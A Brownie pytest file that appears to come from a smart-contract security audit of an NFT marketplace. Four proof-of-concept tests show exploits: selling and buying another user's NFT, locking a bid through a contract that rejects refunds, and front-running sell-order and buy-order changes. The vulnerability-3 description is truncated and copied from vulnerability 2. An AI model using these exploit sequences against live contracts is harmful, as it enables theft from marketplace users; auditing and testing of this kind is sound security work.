import pytest
from brownie import *


@pytest.fixture
def ape_coin(admin_account):
    return ApeCoin.deploy({"from": admin_account})


@pytest.fixture
def halborn_nft(admin_account):
    return HalbornNFT.deploy({"from": admin_account})


@pytest.fixture
def nft_marketplace(admin_account, ape_coin, halborn_nft):
    return NFTMarketplace.deploy(admin_account.address, ape_coin.address, halborn_nft.address, {"from": admin_account})


@pytest.fixture
def admin_account():
    return accounts[0]


# VULNERABILITY 1
# Description: The postSellOrder function is not checking for the NFT ownership
# Impact: Anyone is able to sell NFTs of other users by front-running postSellOrder function call.
def test_vuln_1(admin_account, ape_coin, halborn_nft, nft_marketplace):
    # Setup accounts
    seller_account = accounts.add()
    hacker_account = accounts.add()

    # Mint 100 Ape to hacker account
    mint_ape_coins = 100
    ape_coin.mint(hacker_account.address, mint_ape_coins, {"from": admin_account})
    ape_coin.approve(nft_marketplace.address, mint_ape_coins, {"from": hacker_account})

    # Mint a random NFT to seller account & approve Marketplace
    nft_id = "{0:#0{1}x}".format(0, 34)
    halborn_nft.safeMint(seller_account.address, nft_id, {"from": admin_account})
    halborn_nft.approve(nft_marketplace.address, nft_id, {"from": seller_account})

    # Post a sell order from Hackers account for the NFT owned by the seller account
    sell_amount = 1
    nft_marketplace.postSellOrder(nft_id, sell_amount, {"from": hacker_account})

    # Check that the sell order is created by the Hacker
    current_sell_order = nft_marketplace.viewCurrentSellOrder(nft_id, {"from": hacker_account})
    assert current_sell_order[0] == hacker_account.address

    # Hacker can also buy the NFT (not owned by them) for the sell order they created with the specified amount APE
    nft_marketplace.buySellOrder(nft_id, {"from": hacker_account})
    assert halborn_nft.ownerOf(nft_id) == hacker_account.address


# VULNERABILITY 2
# Description: The bid function is using a call method expecting the address would be an EOA but it can be a contract
# Impact: Anyone is able to bid to an NFT and lock the bid price by sending the request from a contract and not \
# accepting the ethereum back when another user tries to outbid them
def test_vuln_2(admin_account, halborn_nft, nft_marketplace):
    # Setup accounts & contract
    hacker_account = accounts[1]
    buyer_account = accounts[2]
    seller_account = accounts.add()

    # A mock contract to demonstrate the ability to reject receiving ether & call the bid function (serving as proxy)
    hacker_contract = HackerContract.deploy({"from": hacker_account})

    # Mint a random NFT to seller account & approve Marketplace
    nft_id = "{0:#0{1}x}".format(0, 34)
    halborn_nft.safeMint(seller_account.address, nft_id, {"from": admin_account})
    halborn_nft.approve(nft_marketplace.address, nft_id, {"from": seller_account})

    # Call Bid function on NFTMarketPlace from the Hackers Contract
    hacker_contract.bid(nft_marketplace.address, nft_id, {"from": hacker_account, "value": 1})

    # Now call the Bid function again from a random buyer account and notice bid cannot be changed
    with pytest.reverts("Ether return for the previous bidder failed"):
        nft_marketplace.bid(nft_id, {"from": buyer_account, "value": 100})


# VULNERABILITY 3
# Description: The buySellOrder function vulnerable as it
# Impact: Anyone is able to bid to an NFT and lock the bid price by sending the request from a contract and not \
# accepting the ethereum back when another user tries to outbid them
def test_vuln_3(admin_account, ape_coin, halborn_nft, nft_marketplace):
    # Setup accounts
    seller_account = accounts.add()
    buyer_account = accounts.add()

    # Mint 100 Ape to buyer account & approve Marketplace as spender
    mint_ape_coins = 100
    ape_coin.mint(buyer_account.address, mint_ape_coins, {"from": admin_account})
    ape_coin.approve(nft_marketplace.address, 100, {"from": buyer_account})

    # Mint a random NFT to seller account & approve Marketplace
    nft_id = "{0:#0{1}x}".format(0, 34)
    halborn_nft.safeMint(seller_account.address, nft_id, {"from": admin_account})
    halborn_nft.approve(nft_marketplace.address, nft_id, {"from": seller_account})

    # Post a sell order from the seller account for the owned NFT
    sell_amount = 10  # Random amount
    nft_marketplace.postSellOrder(nft_id, sell_amount, {"from": seller_account})

    # Buyer account see the sell order with sell_amount = 10 and decide to buy - IN THE MEANTIME
    # Seller account updates the Sell order with a higher price as it is possible to update
    # Additionally - this can be updated by anyone also, as mentioned on Vuln 1
    sell_amount = 100
    nft_marketplace.postSellOrder(nft_id, sell_amount, {"from": seller_account})

    # Buyer account buy the sell order with the updated price unknowingly
    nft_marketplace.buySellOrder(nft_id, {"from": buyer_account})
    assert ape_coin.balanceOf(buyer_account.address) == mint_ape_coins - sell_amount  # 100 - 100 = 0 ape
    assert halborn_nft.ownerOf(nft_id) == buyer_account.address


# VULNERABILITY 4
# Description: The sellToOrderId function vulnerable as orders can be updated in the mean time
# Impact: A buyer can decrease (or increase) the APE amount after the seller decides to sell to that particular order
def test_vuln_4(admin_account, ape_coin, halborn_nft, nft_marketplace):
    # Setup accounts
    seller_account = accounts[1]
    buyer_account = accounts[2]

    # Mint 100 Ape to buyer account & approve Marketplace as spender
    mint_ape_coins = 100
    ape_coin.mint(buyer_account.address, mint_ape_coins, {"from": admin_account})
    ape_coin.approve(nft_marketplace.address, 100, {"from": buyer_account})

    # Mint a random NFT to seller account & approve Marketplace
    nft_id = "{0:#0{1}x}".format(0, 34)
    halborn_nft.safeMint(seller_account.address, nft_id, {"from": admin_account})
    halborn_nft.approve(nft_marketplace.address, nft_id, {"from": seller_account})

    # Post a buy order from the buyer account for the NFT owned by Seller
    buy_amount = 100
    order = nft_marketplace.postBuyOrder(nft_id, buy_amount, {"from": buyer_account})
    order_id = order.events["BuyOrderListed"]["orderId"]

    # Seller account lists buy orders and notice the order created by buyer account - and decides to sell to that order
    buy_orders = nft_marketplace.viewBuyOrders(nft_id, {"from": seller_account})
    assert buy_orders[0][0] == buyer_account.address

    # Just before seller selling to the order, buyer decrease the amount by calling decreaseBuyOrder
    decrease_amount = 99
    nft_marketplace.decreaseBuyOrder(order_id, decrease_amount, {"from": buyer_account})

    # Seller sell to order by unknowingly a lower amount from what it was supposed to
    nft_marketplace.sellToOrderId(order_id, {"from": seller_account})
    assert nft_marketplace.getOrderStatus(order_id) == 1  # 1 = "Fulfilled" Enum value
    assert ape_coin.balanceOf(buyer_account.address) == 99


# TODO: Add other tests for all the contract methods that use the following:
#  require(
#             order.status != OrderStatus.Cancelled ||
#                 order.status != OrderStatus.Fulfilled,
#             "Order should be listed"
#         );
